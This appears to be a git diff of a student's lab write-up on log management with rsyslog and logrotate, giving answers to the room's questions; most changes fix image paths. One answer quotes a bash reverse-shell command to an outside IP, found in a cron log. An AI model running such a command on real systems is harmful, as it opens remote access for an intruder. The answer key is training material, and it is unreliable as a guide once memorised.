@@ -60,23 +60,23 @@ Based on the list of log formats in this task, what log format is used by the lo
 After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?
 - `stansimon`
 
-![alt text](.\images\image-2.png)
+![alt text](images/image-2.png)
 
 What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages?
 - `10.10.10.101`
 
-![alt text](.\images\image-3.png)
+![alt text](images/image-3.png)
 
 Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?
 - `/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"`
 
-![alt text](.\images\image-4.png)
+![alt text](images/image-4.png)
 - a reverse shell command...
 
 Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept?
 - 24
 
-![alt text](.\images\image-6.png)
+![alt text](images/image-6.png)
 
 Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency?
 - hourly
@@ -84,7 +84,7 @@ Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, wh
 Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters?
 - `no date field`
 
-![alt text](.\images\image-7.png)
+![alt text](images/image-7.png)
 
 What is the process of standardising parsed data into a more easily readable and query-able format?
 - `normalisation`
@@ -99,7 +99,7 @@ first ssh'd into the machine from my kali attackbox
 
 check if rsyslog is installed / running:
 
-![alt text](.\images\image.png)
+![alt text](images/image.png)
 
 create config file:
 
@@ -113,7 +113,7 @@ restart rsyslog: `sudo systemctl restart rsyslog`
 
 check its all working:
 
-![alt text](.\images\image-1.png)
+![alt text](images/image-1.png)
 
 #### Practical Activity: Log Management with logrotate
 - automates log file rotation, compression, and management
